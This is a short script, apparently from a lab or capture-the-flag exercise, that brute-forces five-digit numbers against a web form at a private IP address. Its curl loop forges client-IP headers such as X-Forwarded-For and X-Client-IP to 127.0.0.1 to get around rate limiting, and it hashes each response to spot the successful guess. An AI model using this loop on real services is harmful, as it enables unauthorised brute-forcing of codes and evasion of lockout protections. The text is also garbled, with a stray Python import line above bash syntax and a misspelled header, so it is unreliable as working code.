import os

for i in {10000..99999}; do curl -X POST -s http://10.10.210.62:8085/home -H "X-Originating-IP: 127.0.0.1" -H "X-Forwarded-For: 127.0.0.1" -H "X-Remote-IP: 127.0.0.1" -H "X-Remote-Addr: 127.0.0.1" -H "X-Client-IP: 127.0.0.1" -H "X-Host: 127.0.0.1" -H "X-Forwared-Host: 127.0.0.1" --data "number=$i" | md5sum; echo $i;done
